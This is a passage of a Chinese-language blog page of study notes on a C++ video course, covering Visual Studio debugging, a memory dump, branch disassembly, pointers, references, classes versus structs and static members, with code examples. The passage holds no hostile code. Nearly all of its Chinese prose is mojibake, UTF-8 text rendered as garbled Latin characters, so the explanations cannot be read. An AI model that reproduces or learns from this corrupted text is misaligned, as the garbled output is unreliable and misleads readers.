class="function"><span class="type">void</span> <span class="title">InitLog</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Log</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Player</span> &#123;&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>&lt;&gt;ä¸â€œâ€ï¼š</p><ul><li>å°–æ‹¬å·ï¼šå‘Šè¯‰<strong>ç¼–è¯‘å™¨ç›®æ ‡è·¯å¾„</strong>ä¸­åŒ…å«æ‰€éœ€è¦åŒ…å«çš„æ–‡ä»¶å¤¹ã€‚</li><li>å¼•å·ï¼š æ—¢åŒ…å«ç›¸å¯¹äºå½“å‰è·¯å¾„çš„æ–‡ä»¶ï¼Œæ¯”å¦‚<code>#include â€œ../Log.hâ€</code> ï¼Œåˆå¯ç”¨æ¥æŒ‡å®šç¼–è¯‘å™¨åŒ…å«ç›®å½•çš„ç›¸å¯¹è·¯å¾„é‡Œçš„æ–‡ä»¶ï¼Œæ¯”å¦‚<code>#include â€œiostreamâ€</code> ã€‚</li><li>å°–æ‹¬å·åªç”¨äºç¼–è¯‘å™¨åŒ…å«è·¯å¾„ï¼Œå¼•å·å¯ä»¥åšä¸€åˆ‡ï¼ˆé€šå¸¸ç”¨åœ¨åŒ…å«ç›¸å¯¹è·¯å¾„ï¼‰ã€‚</li></ul><p>iostreamå…¶å®ä¹Ÿæ˜¯æ–‡ä»¶ï¼Œåªä¸è¿‡æ²¡æœ‰æ‰©å±•åï¼Œc++è®¾è®¡è€…æœ‰æ„é€šè¿‡è¿™ç‚¹å°†C++æ ‡å‡†åº“ä¸Cæ ‡å‡†åº“åŒºåˆ†ã€‚</p><h1 id="11-How-to-DUBUG-in-VS">11 How to DUBUG in VS</h1><p>è°ƒè¯•çš„ä¸¤å¤§éƒ¨åˆ†ï¼šæ–­ç‚¹ å’Œ è¯»å–å†…å­˜ã€‚</p><p>VSçš„è°ƒè¯•æ¨¡å¼ä¸­ä¼šç»™æ‰€æœ‰æœªåˆå§‹åŒ–çš„å±€éƒ¨å˜é‡èµ‹å€¼ä¸º<code>0xcc</code>ï¼Œ åœ¨è°ƒè¯•/çª—å£/å†…å­˜ä¸­å¯ä»¥æ‰“å¼€å†…å­˜è§†å›¾ï¼Œè¾“å…¥<code>&amp;a</code>ï¼Œå¯ä»¥æŸ¥çœ‹å˜é‡åœ°å€å’Œå€¼ã€‚</p><p>stråˆå§‹åŒ–åï¼Œå¯ä»¥é€šè¿‡å…¶å€¼ï¼ˆæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²åœ°å€ï¼‰å»å¯»æ‰¾åˆ°å¯¹åº”å­—ç¬¦ä¸²ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00609B30</span>  <span class="number">68</span> <span class="number">65</span> <span class="number">6</span>c <span class="number">6</span>c <span class="number">6f</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">48</span> <span class="number">65</span> <span class="number">6</span>c <span class="number">6</span>c <span class="number">6f</span> <span class="number">20</span> <span class="number">57</span> <span class="number">6f</span> <span class="number">72</span> <span class="number">6</span>c <span class="number">64</span> <span class="number">21</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> b0 <span class="number">40</span> <span class="number">08</span> <span class="number">9</span>c  hello...Hello World!......?@.?</span><br><span class="line"><span class="number">0x00609B4E</span>  <span class="number">60</span> <span class="number">00</span> <span class="number">18</span> <span class="number">9</span>d <span class="number">60</span> <span class="number">00</span> <span class="number">70</span> <span class="number">9</span>e <span class="number">60</span> <span class="number">00</span> <span class="number">94</span> <span class="number">9</span>e <span class="number">60</span> <span class="number">00</span> d4 <span class="number">9</span>e <span class="number">60</span> <span class="number">00</span> <span class="number">08</span> <span class="number">9f</span> <span class="number">60</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  `..?`.p?`.??`.??`..?`.........</span><br><span class="line"><span class="number">0x00609B6C</span>  <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">53</span> <span class="number">74</span> <span class="number">61</span> <span class="number">63</span> <span class="number">6b</span> <span class="number">20</span> <span class="number">61</span> <span class="number">72</span> <span class="number">6f</span> <span class="number">75</span> <span class="number">6</span>e <span class="number">64</span> <span class="number">20</span> <span class="number">74</span>  ................Stack around t</span><br><span class="line"><span class="number">0x00609B8A</span>  <span class="number">68</span> <span class="number">65</span> <span class="number">20</span> <span class="number">76</span> <span class="number">61</span> <span class="number">72</span> <span class="number">69</span> <span class="number">61</span> <span class="number">62</span> <span class="number">6</span>c <span class="number">65</span> <span class="number">20</span> <span class="number">27</span> <span class="number">00</span> <span class="number">27</span> <span class="number">20</span> <span class="number">77</span> <span class="number">61</span> <span class="number">73</span> <span class="number">20</span> <span class="number">63</span> <span class="number">6f</span> <span class="number">72</span> <span class="number">72</span> <span class="number">75</span> <span class="number">70</span> <span class="number">74</span> <span class="number">65</span> <span class="number">64</span> <span class="number">2</span>e  he variable <span class="string">&#x27;.&#x27;</span> was corrupted.</span><br><span class="line"><span class="number">0x00609BA8</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">54</span> <span class="number">68</span> <span class="number">65</span> <span class="number">20</span> <span class="number">76</span> <span class="number">61</span> <span class="number">72</span> <span class="number">69</span> <span class="number">61</span> <span class="number">62</span> <span class="number">6</span>c <span class="number">65</span> <span class="number">20</span> <span class="number">27</span> <span class="number">00</span> <span class="number">00</span> <span class="number">27</span> <span class="number">20</span> <span class="number">69</span> <span class="number">73</span> <span class="number">20</span> <span class="number">62</span> <span class="number">65</span> <span class="number">69</span> <span class="number">6</span>e <span class="number">67</span>  ....The variable <span class="string">&#x27;..&#x27;</span> is being</span><br><span class="line"><span class="number">0x00609BC6</span>  <span class="number">20</span> <span class="number">75</span> <span class="number">73</span> <span class="number">65</span> <span class="number">64</span> <span class="number">20</span> <span class="number">77</span> <span class="number">69</span> <span class="number">74</span> <span class="number">68</span> <span class="number">6f</span> <span class="number">75</span> <span class="number">74</span> <span class="number">20</span> <span class="number">62</span> <span class="number">65</span> <span class="number">69</span> <span class="number">6</span>e <span class="number">67</span> <span class="number">20</span> <span class="number">69</span> <span class="number">6</span>e <span class="number">69</span> <span class="number">74</span> <span class="number">69</span> <span class="number">61</span> <span class="number">6</span>c <span class="number">69</span> <span class="number">7</span>a <span class="number">65</span>   used without being initialize</span><br><span class="line"><span class="number">0x00609BE4</span>  <span class="number">64</span> <span class="number">2</span>e <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  d.............................</span><br><span class="line"><span class="number">0x00609C02</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">54</span> <span class="number">68</span> <span class="number">65</span> <span class="number">20</span> <span class="number">76</span> <span class="number">61</span> <span class="number">6</span>c <span class="number">75</span> <span class="number">65</span> <span class="number">20</span> <span class="number">6f</span> <span class="number">66</span> <span class="number">20</span> <span class="number">45</span> <span class="number">53</span> <span class="number">50</span> <span class="number">20</span> <span class="number">77</span> <span class="number">61</span> <span class="number">73</span> <span class="number">20</span> <span class="number">6</span>e <span class="number">6f</span> <span class="number">74</span>  ......The value of ESP was <span class="keyword">not</span></span><br></pre></td></tr></table></figure><h1 id="12-CONDITIONS-and-BRANCHES-in-C">12 CONDITIONS and BRANCHES in C++</h1><p>å¯ä»¥é€šè¿‡é¿å…åˆ†æ”¯å¯¹ç¨‹åºè¿›è¡Œä¼˜åŒ–ã€‚</p><p>å¯ä»¥åœ¨VSç¼–è¾‘åŒºå³é”®è¿›å…¥åæ±‡ç¼–ä»£ç ï¼Œé™æ€åˆ†æåæ±‡ç¼–ä»£ç åœ¨æ²¡æœ‰æºç æ—¶éå¸¸æœ‰ç”¨ï¼Œä½†åœ¨æœ‰æºç æ—¶è¿™æ˜¯nightmareçš„ï¼Œä¸è¿‡åˆ†ææ±‡ç¼–ä»£ç å¯ä»¥å­¦ä¹ ä¸€äº›çŸ¥è¯†ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> compare_res = x == <span class="number">5</span>;</span><br><span class="line"><span class="number">00</span>AB195C  cmp         dword ptr [x],<span class="number">5</span>  </span><br><span class="line"><span class="number">00</span>AB1960  jne         __$EncStackInitStart+<span class="number">32</span>h (<span class="number">0</span>AB196Eh)  </span><br><span class="line"><span class="number">00</span>AB1962  mov         dword ptr [ebp<span class="number">-0</span>DCh],<span class="number">1</span>  </span><br><span class="line"><span class="number">00</span>AB196C  jmp         __$EncStackInitStart+<span class="number">3</span>Ch (<span class="number">0</span>AB1978h)  </span><br><span class="line"><span class="number">00</span>AB196E  mov         dword ptr [ebp<span class="number">-0</span>DCh],<span class="number">0</span>  </span><br><span class="line"><span class="number">00</span>AB1978  movzx       eax,byte ptr [ebp<span class="number">-0</span>DCh]  </span><br><span class="line"><span class="number">00</span>AB197F  mov         byte ptr [compare_res],al</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> compare_res = <span class="number">423</span>;</span><br><span class="line"><span class="number">00F</span>B195C  mov         byte ptr [compare_res],<span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong>ä¸è¦å†™å•è¡Œå†™ <code>if (x == 5)  cout &lt;&lt; â€œyâ€ &lt;&lt; endl;</code> ï¼šè°ƒè¯•æ—¶ä¸èƒ½è¿›å…¥åä¸€å¥</strong>ä¸”<strong>ä¸ä¾¿äºå¢æ·»ï¼</strong></p><p><code>else if</code> å¹¶éä»€ä¹ˆC++å…³é”®è¯ï¼Œå…¶å®å°±æ˜¯ <code>else + if (æ¡ä»¶)</code> ã€‚</p><h1 id="13-BEST-Visual-Studio-Setup-for-C-Projects">13 BEST Visual Studio Setup for C++ Projects!</h1><p>VSä¸­å±•ç¤ºçš„å¹¶ä¸æ˜¯æ–‡ä»¶å¤¹ï¼ˆfolderï¼‰ï¼Œè€Œæ˜¯è¿‡æ»¤å™¨ï¼ˆfilterï¼‰ã€‚åœ¨é¡¹ç›®ä¸‹æ–°å»ºçš„ä¹Ÿæ˜¯filterã€‚<br>ç‚¹å‡»â€œæ˜¾ç¤ºæ‰€æœ‰æ–‡ä»¶çš„å›¾æ ‡â€åå±•ç¤ºçš„å°±æ˜¯ç£ç›˜ç›®å½•è§†å›¾ï¼Œåœ¨è¿™é‡Œå¯ä»¥æ–°å»ºfolderã€‚æ¨èæ–°å»ºä¸€ä¸ª<code>src</code>æ–‡ä»¶å¤¹ï¼Œç„¶åå°†æ‰€æœ‰cppæ–‡ä»¶å’Œå¤´æ–‡ä»¶éƒ½æ”¾åˆ°é‡Œé¢ã€‚</p><p>è¾“å‡ºç›®å½•ï¼š<code>$(SolutionDir)bin\$(Platform)\$(Configuration)\</code></p><p>ä¸­é—´ä»¶ç›®å½•ï¼š<code>$(SolutionDir)bin\intermediates\$(Platform)\$(Configuration)\</code></p><h1 id="14-Loops-in-C-for-loops-while-loops">14 Loops in C++ (for loops, while loops)</h1><p>ä¸ªäººè§‰å¾—å¾ªç¯æ²¡å•¥å¥½è®²çš„</p><h1 id="15-Control-Flow-in-C-continue-break-return">15 Control Flow in C++ (continue, break, return)</h1><ul><li>continueï¼šåªåœ¨loopä¸­å‡ºç°ã€‚</li><li>breakï¼šå¤šåœ¨loopä¸­å‡ºç°ï¼Œä¹Ÿåœ¨switchä¸­å‡ºç°ã€‚</li><li>returnï¼šå®Œå…¨é€€å‡ºfunctionï¼Œåœ¨å“ªéƒ½å¯ä»¥ã€‚</li></ul><h1 id="16-POINTERS-in-C">16 POINTERS in C++</h1><p>ç›®å‰åªè®¨è®ºraw pointersï¼Œä¸è®¨è®ºsmart pointersã€‚</p><p>æŒ‡é’ˆå¯¹manageå’Œmanipulateå†…å­˜æåº¦é‡è¦ï¼Œpointer is a integer which stores a memory addressã€‚ç±»å‹å®é™…ä¸Šæ²¡æœ‰æ„ä¹‰ï¼Œåªæ˜¯å¸®åŠ©æ¨æ–­åœ°å€æ‰€æŒ‡çš„æ•°æ®ç±»å‹ã€‚</p><p><code>void* ptr = 0;</code>  è¡¨è¿°æ­¤æ— ç±»å‹ï¼ˆç±»å‹å®é™…ä¸Šæ— æ„ä¹‰ï¼‰æŒ‡é’ˆä¸ºNULLï¼Œå†…å­˜åœ°å€ä¸èƒ½åˆ°0ã€‚<br>å®é™…ä¸Š0è¡¨ç¤ºNULLï¼Œæˆ–è€…è¯´NULLå’Œnullptrè¢«defineä¸º0ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">6</span>;</span><br><span class="line"><span class="type">double</span>* ptr = (<span class="type">double</span>*)&amp;x;</span><br><span class="line">*ptr = <span class="number">10</span>;</span><br><span class="line">std::cout &lt;&lt; x &lt;&lt; std::endl;  <span class="comment">// æœ€ç»ˆè¾“å‡º0</span></span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å™¨ä¼šæ ¹æ®ç±»å‹è®¾ç½®ä½æ¨¡å¼ï¼Œä¹Ÿä¼šæ ¹æ®ç±»å‹è§£é‡Šä½æ¨¡å¼ã€‚</p><p><img src="/2023/04/01/C-Cherno-Cherno%E7%AC%94%E8%AE%B0-1-30/Untitled.png" alt="Untitled"></p><p>é€†å‘å¼•ç”¨ï¼šæŒ‡é’ˆçš„*è¿ç®—ç¬¦é€šå¸¸è¢«ç§°ä¸ºdereferenceè¿ç®—ç¬¦</p><p>æŒ‡é’ˆä¹Ÿæ˜¯å­˜åœ¨äºå†…å­˜ä¸­çš„<strong>å˜é‡</strong>ï¼Œå¯ä»¥ä½¿ç”¨double pointerã€‚</p><p>æŒ‡é’ˆæŒ‡å‘å †ä¸Šå†…å­˜çš„ä¾‹å­ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>* buffer = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span>[] buffer;</span><br></pre></td></tr></table></figure><p>æ³¨æ„æ‰‹åŠ¨åˆ é™¤æŒ‡é’ˆæ•°ç»„éœ€è¦ä½¿ç”¨<code>delete []</code>ã€‚</p><h1 id="17-REFERENCES-in-C">17 REFERENCES in C++</h1><p>å¼•ç”¨åªæ˜¯æŒ‡é’ˆçš„æ‰©å±•ï¼Œæ˜¯æŒ‡é’ˆçš„è¯­æ³•ç³–ï¼Œä½¿å®ƒæ›´å®¹æ˜“å®¹æ˜“é˜…è¯»ã€æ›´å®¹æ˜“ç†è§£ã€‚<br><strong>æ²¡æœ‰ä»€ä¹ˆå¼•ç”¨èƒ½åšè€ŒæŒ‡é’ˆä¸èƒ½åšçš„äº‹æƒ…</strong>ï¼ŒæŒ‡é’ˆæ›´æœ‰ç”¨æ›´å¼ºå¤§ï¼Œä½†æ˜¯å¾ˆå¤šæƒ…å†µä¸‹ä½¿ç”¨å¼•ç”¨æ›´ç®€å•ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// --- æŒ‡é’ˆ ---</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">increase</span><span class="params">(<span class="type">int</span> *val)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//(*val)++;  // å¿…é¡»åŠ æ‹¬å·, ++ä¼˜å…ˆçº§æ¯”*é«˜</span></span><br><span class="line">  ++(*val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> a = <span class="number">8</span>;</span><br><span class="line">  <span class="built_in">increase</span>(&amp;a);</span><br><span class="line">  std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- å¼•ç”¨ ---</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">increase</span><span class="params">(<span class="type">int</span> &amp;val)</span> </span>&#123;</span><br><span class="line">  ++val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> a = <span class="number">8</span>;</span><br><span class="line">  <span class="built_in">increase</span>(a);</span><br><span class="line">  std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼•ç”¨æ˜¯å¼•ç”¨ç°æœ‰å˜é‡çš„æ–¹å¼ï¼Œ<strong>å¼•ç”¨æœ¬èº«åªæ˜¯åˆ«åï¼Œä¸æ˜¯å˜é‡ï¼Œä¸å å†…å­˜</strong>ï¼Œä¸åƒæŒ‡é’ˆå¯ä»¥ä¼ åˆ›å»ºä¸€ä¸ªæ–°æŒ‡é’ˆå˜é‡ç„¶åè®¾ç½®å®ƒç­‰äºç©ºæŒ‡é’ˆæˆ–è€…ç±»ä¼¼çš„ä¸œè¥¿ã€‚<br><strong>å®šä¹‰å¼•ç”¨åæ— æ³•ä¿®æ”¹ï¼Œå£°æ˜æ—¶å¿…é¡»ç«‹å³èµ‹å€¼ã€‚</strong></p><p><code>int&amp; alias = a;</code>  &amp;æ˜¯ç±»å‹çš„ä¸€éƒ¨åˆ†ï¼Œè¿™ä¸æŒ‡é’ˆä¸­ä½¿ç”¨åˆ°çš„å–åœ°å€ç¬¦ä¸åŒï¼Œè¿™é‡Œaliasåªæ˜¯åˆ«åï¼Œé€šè¿‡æ±‡ç¼–ä»£ç å»çœ‹çš„è¯ï¼Œåªæœ‰ä¸€ä¸ªå˜é‡</p><blockquote><p>ğŸ’¡ å¼•ç”¨å’ŒæŒ‡é’ˆçš„åŒºåˆ«ï¼š<br>æœ¬è´¨ä¸ŠæŒ‡é’ˆæ˜¯å­˜å‚¨åœ°å€çš„å¯¹è±¡ï¼ˆå˜é‡ï¼‰ï¼Œè€Œå¼•ç”¨æ˜¯å¯¹è±¡çš„åˆ«åï¼Œå› æ­¤ï¼š</p><ol><li>æŒ‡é’ˆå å†…å­˜ç©ºé—´ï¼›è€Œå¼•ç”¨ä¸å ã€‚</li><li>æŒ‡é’ˆä¸å¿…åˆå§‹åŒ–ï¼ˆè¿™æ—¶ä½¿ç”¨é»˜è®¤åˆå§‹åŒ–ï¼‰ï¼›è€Œå¼•ç”¨å¿…é¡»åˆå§‹åŒ–ã€‚</li><li>æŒ‡é’ˆå¯ä»¥é‡æ–°èµ‹å€¼ï¼›è€Œå¼•ç”¨ä¸èƒ½ã€‚</li><li>å¯ä»¥å­˜åœ¨æŒ‡é’ˆçš„æŒ‡é’ˆç­‰ï¼›è€Œä¸å­˜åœ¨å¼•ç”¨çš„å¼•ç”¨ã€‚<br>ä¸ªäººç†è§£ï¼šå¼•ç”¨æ˜¯æŒ‡é’ˆçš„è¯­æ³•ç³–ï¼Œå®ƒè‡ªå¸¦é¡¶å±‚constå±æ€§ã€‚</li></ol><p>PSï¼š<br>é¡¶å±‚constï¼ˆtop-level constï¼‰ï¼šæœ¬èº«æ˜¯ä¸ªå¸¸é‡ã€‚<br>åº•å±‚constï¼ˆlow-level constï¼‰ï¼šæ‰€æŒ‡å¯¹è±¡æ˜¯ä¸€ä¸ªå¸¸é‡ã€‚</p></blockquote><h1 id="18-CLASSES-in-C">18 CLASSES in C++</h1><p>ç±»åªæ˜¯æ–¹ä¾¿ç»„åˆæ•°æ®å’Œå‡½æ•°çš„ä¸€ç§ç®€å•æ–¹å¼ã€‚<strong>ä»»ä½•ä½¿ç”¨classåšçš„äº‹æƒ…ï¼Œä¸ç”¨classä¹Ÿèƒ½åšï¼Œclasså¹¶æ²¡æœ‰æä¾›æ–°çš„functionalityã€‚</strong></p><p>ç±»æ˜¯ä¸€ç§å˜é‡ç±»å‹ï¼Œæ˜¯è‡ªå®šä¹‰æ•°æ®ç±»å‹çš„åŸºç¡€ã€‚</p><h1 id="19-CLASSES-vs-STRUCTS-in-C">19 CLASSES vs STRUCTS in C++</h1><p>ç±»å’Œç»“æ„ä½“å”¯ä¸€åŒºåˆ«æ˜¯ï¼šç±»é»˜è®¤æ˜¯privateçš„ï¼Œç»“æ„ä½“é»˜è®¤æ˜¯publicçš„ã€‚<br>structåœ¨c++ä¸­å”¯ä¸€å­˜åœ¨çš„åŸå› æ˜¯ï¼ŒC++å¸Œæœ›ä¸Cä¿æŒå‘åå…¼å®¹æ€§ã€‚</p><p>å¦‚æœæƒ³è¦æ‰€æœ‰æˆå‘˜éƒ½æ˜¯publicçš„ï¼Œç„¶è€Œåˆä¸æƒ³å†™ä¸Špublicï¼Œåº”è¯¥ä½¿ç”¨structå—ï¼Ÿâ€”â€”æ˜¯çš„ï¼Œå®ƒå°±ç®—è¿™æ ·çš„å¾®ä¸è¶³é“ã€‚ ï¼ˆè¿™ä¸ªé—®é¢˜ä¸ç»å¯¹ï¼Œå–å†³äºç¼–ç¨‹é£æ ¼ï¼‰</p><p>ä»æŠ€æœ¯ä¸Šè®²ï¼Œ<strong>é™¤äº†visibilityï¼ŒäºŒè€…å¯èƒ½æ²¡æœ‰å¤ªå¤§åŒºåˆ«</strong>ï¼Œç„¶è€Œå®é™…çš„ä½¿ç”¨æƒ…å†µä¼šæœ‰æ‰€ä¸åŒã€‚â€”â€”ç»§æ‰¿ï¼Œ<strong>ä¸è¦åœ¨structä¸­ä½¿ç”¨ç»§æ‰¿</strong>ï¼Œè‹¥è¦æœ‰ä¸€ä¸ªå®Œæ•´çš„ç±»å±‚æ¬¡ï¼Œä½¿ç”¨ç±»ã€‚</p><h1 id="20-How-to-Write-a-C-Class">20 How to Write a C++ Class</h1><p>è¿™èŠ‚è®²ç±»è®²çš„éå¸¸ç®€å•ï¼Œæœ¬èŠ‚ç»™å‡ºäº†ä¸€ä¸ªLogç±»çš„ä¾‹å­ï¼Œç¬¬23èŠ‚[â€ENUMS in C++â€œ](./# ENUMS in C++)ä¸­ç»™å‡ºäº†æ­¤Logç±»ä¾‹å­çš„å‡çº§ç‰ˆã€‚</p><h1 id="21-Static-in-C">21 Static in C++</h1><p>staticåœ¨C++ä¸­æ ¹æ®ä¸Šä¸‹æ–‡æœ‰ä¸¤ç§æ„æ€ï¼Œä¸€ç§æ˜¯åœ¨ç±»æˆ–ç»“æ„ä½“å¤–ä½¿ç”¨staticå…³é”®å­—ï¼Œä¸€ç§æ˜¯åœ¨ç±»æˆ–ç»“æ„ä½“å†…éƒ¨ä½¿ç”¨staticã€‚</p><ul><li>ç±»å¤–çš„staticï¼Œå£°æ˜ä¸ºstaticçš„ç¬¦å·é“¾æ¥å°†åªåœ¨å†…éƒ¨ï¼Œè¿™æ„å‘³ç€å®ƒåªå¯¹å®šä¹‰æ‰€åœ¨çš„ç¿»è¯‘å•å…ƒå¯è§ã€‚</li><li>ç±»æˆ–ç»“æ„ä½“å†…çš„staticï¼Œæ„å‘³ç€è¯¥å˜é‡å®é™…ä¸Šå°†ä¸ç±»æ‰€æœ‰å®ä¾‹å…±äº«å†…å­˜ï¼Œé™æ€å˜é‡åªæœ‰1ä¸ªå®ä¾‹ã€‚</li></ul><p><strong>ä¸åŒæ–‡ä»¶ä¸­ä¸èƒ½æœ‰åŒåçš„å…¨å±€å˜é‡</strong>ï¼Œé™¤éä½¿ç”¨staticä¿®é¥°ï¼Œæˆ–è€…åœ¨æŸä¸ªæ–‡ä»¶ä¸­ä½¿ç”¨ <code>extern</code> å£°æ˜ã€‚</p><p>å…¨å±€å˜é‡ä¸å¥½ï¼Œä¸€å®šè¦å°½å¯èƒ½ä½¿ç”¨staticï¼Œé™¤éçœŸçš„éœ€è¦è·¨ç¿»è¯‘å•å…ƒé“¾æ¥ã€‚</p><h1 id="22-Static-for-Classes-and-Structs-in-C">22 Static for Classes and Structs in C++</h1><p>é€šè¿‡ç±»å®ä¾‹å¼•ç”¨é™æ€å˜é‡æ— æ„ä¹‰ï¼Œå› ä¸ºç±»é™æ€å˜é‡å°±åƒç±»çš„å…¨å±€å®ä¾‹ä¸€æ ·ã€‚<br>é™æ€æ–¹æ³•ä¹Ÿæ˜¯ä¸€æ ·ï¼Œ<strong>æ— æ³•è®¿é—®ç±»çš„å®ä¾‹</strong>ï¼Œé™æ€æ–¹æ³•ä¸éœ€è¦é€šè¿‡ç±»çš„å®ä¾‹è¢«è°ƒç”¨ï¼Œè€Œåœ¨é™æ€æ–¹æ³•å†…éƒ¨ï¼Œä¸èƒ½å†™å¼•ç”¨åˆ°ç±»å®ä¾‹çš„ä»£ç ï¼Œ<strong>é™æ€æ–¹æ³•ä¹Ÿä¸èƒ½è®¿é—®éé™æ€å˜é‡</strong>ã€‚</p><blockquote><p>ğŸ’¡ åœ¨ç±»ä¸­å†™çš„æ¯ä¸ªéé™æ€æ–¹æ³•æ€»ä¼šè·å¾—å½“å‰ç±»çš„ä¸€ä¸ªå®ä¾‹ä½œä¸ºå‚æ•°ï¼Œè€Œé™æ€æ–¹æ³•ä¸ä¼šè·å¾—é‚£ä¸ªéšè—å‚æ•°ï¼Œæ‰€ä»¥ä¸èƒ½è®¿é—®éé™æ€å˜é‡ã€‚</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">int</span> x, y;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;x = &quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; y = &quot;</span> &lt;&lt; y &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> Entity::x, Entity::y;  <span class="comment">// ä¸€å®šè¦å£°æ˜</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Entity e1;</span><br><span class="line">  e1.x = <span class="number">2</span>;</span><br><span class="line">  e1.y = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Entity e2 = &#123;5, 8&#125;;  // åŠ ä¸Šstaticåxå’Œyä¸å†æ˜¯æˆå‘˜å˜é‡ï¼Œä¸èƒ½è¿™æ ·åˆå§‹åŒ–</span></span><br><span class="line">  Entity 